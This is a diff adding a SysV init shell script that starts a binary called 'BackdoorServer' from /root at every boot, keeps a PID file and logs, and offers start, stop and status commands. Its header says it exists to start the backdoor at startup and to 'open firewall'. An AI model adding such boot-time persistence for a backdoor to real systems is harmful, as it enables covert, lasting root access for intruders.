@@ -1,0 +1,45 @@
+#!/bin/sh
+### BEGIN INIT INFO
+# Provides:          BackDoor
+# Required-Start:
+# Required-Stop:
+# Should-Start:
+# Default-Start:     2 3 4 5
+# Default-Stop:
+# Short-Description: It allows you to open firewall.
+# Description:       Intended to start Backdoor on system startup.
+### END INIT INFO
+N=/tmp/BackDoor.pid
+T=/root/BackDoor/
+case "$1" in
+  start)
+  if [ ! -e "$N" ]; then
+	if [ ! -d /var/log/BackDoor/ ]
+	then
+		 mkdir /var/log/BackDoor/
+	fi 
+	/root/BackDoor/BackdoorServer >/var/log/BackDoor/start.log 2>&1 &
+	echo $! >>$N
+  fi
+;;
+  stop)
+   if [ -e "$N" ]; then
+	kill $(cat $N)
+	rm $N
+   fi 
+	EXITSTATUS=0
+	exit $EXITSTATUS
+	;;
+  status)
+   if [ -e "$N" ]; then
+    echo "Running."
+	exit 0
+   fi
+    echo "Stopped."
+	exit 0
+	;;	
+  *)
+	echo "Usage: $T {start|stop|status}" >&2
+	exit 1
+	;;	
+ esac
